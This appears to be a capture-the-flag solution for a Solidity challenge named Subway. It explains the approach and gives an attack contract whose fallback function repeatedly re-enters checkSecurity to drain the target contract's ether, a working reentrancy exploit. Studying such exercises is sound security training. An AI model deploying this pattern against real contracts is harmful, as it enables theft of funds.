# Subway

## Solution

To validate this challenge, we need in a first time, to credit our client account and buy a ticket.
After that, we need to add in our contract a call to the function to pass the security in a fallback/ receive function, which allows when we receive some ethers to recall automatically in the same transaction, the same function.
Once the contract is empty, the challenge is validated.

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/hardChalls/Subway.sol";

contract SubwayAttack {

    Subway originalContract;

    constructor(address payable _originalContract) public {
        originalContract = Subway(_originalContract);
    }

    function exploit() public payable {
        require (msg.value == 1 ether);
        address(originalContract).call.value(1 ether)(abi.encodeWithSignature("credit()"));
        originalContract.buyTickets(1);
        originalContract.checkSecurity();
    }

    fallback() external payable {
        originalContract.checkSecurity();
    }

}
```